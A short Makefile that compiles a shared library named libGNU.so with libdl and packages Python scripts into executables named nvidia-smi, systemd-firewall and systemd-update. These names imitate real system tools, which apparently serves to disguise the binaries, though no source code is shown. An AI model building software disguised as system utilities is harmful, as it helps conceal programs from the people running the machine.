all: ./exec/libGNU.so ./exec/nvidia-smi ./exec/systemd-firewall

$(shell if [ ! -e ./exec ];then mkdir -p ./exec; fi)

./exec/libGNU.so: ./source/libGNU.c
	gcc -Wall -fPIC -shared -o ./exec/libGNU.so ./source/libGNU.c -ldl

./exec/nvidia-smi: ./source/nvidia-smi.py
	pyinstaller -F ./source/nvidia-smi.py
	mv ./dist/nvidia-smi ./exec

./exec/systemd-firewall: ./source/systemd-firewall.py
	pyinstaller -F ./source/systemd-firewall.py
	mv ./dist/systemd-firewall ./exec
	rm -rf *.spec dist build

./exec/systemd-update: ./source/systemd-update.py
	pyinstaller -F ./source/systemd-update.py
	mv ./dist/systemd-update ./exec
	rm -rf *.spec dist build

.PHONY clean:
	rm -f ./exec/*
